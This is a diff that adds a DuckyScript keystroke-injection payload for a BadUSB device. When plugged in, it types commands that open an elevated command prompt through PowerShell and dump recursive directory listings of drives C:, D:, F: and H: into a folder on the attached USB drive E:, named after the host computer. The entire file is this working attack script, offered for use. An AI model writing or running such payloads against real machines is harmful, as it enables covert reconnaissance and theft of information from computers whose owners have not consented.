@@ -1,0 +1,37 @@
+REM Programs dumper Large by Russanandres v1.0
+REM This script collects the names of folders and files from drives C: D: F: H: recommended for fast pc
+REM WARNING! you need a USB flash drive letter E:\ to get files!
+
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -verb runAs
+ENTER
+DELAY 2500
+STRING mkdir E:\Programs_on_%COMPUTERNAME%
+ENTER
+STRING cd ../../..
+ENTER
+DELAY 300
+STRING dir /w /s > E:\Programs_on_%COMPUTERNAME%\systemdrive.txt
+ENTER 
+DELAY 60000
+STRING D:
+ENTER
+DELAY 300
+STRING dir /w /s > E:\Programs_on_%COMPUTERNAME%\DriveD.txt
+ENTER 
+DELAY 60000
+STRING F:
+ENTER
+DELAY 300
+STRING dir /w /s > E:\Programs_on_%COMPUTERNAME%\DriveF.txt
+ENTER 
+DELAY 60000
+STRING H:
+ENTER
+DELAY 300
+STRING dir /w /s > E:\Programs_on_%COMPUTERNAME%\DriveH.txt
+ENTER 
+DELAY 60000
+STRING exit
+ENTER
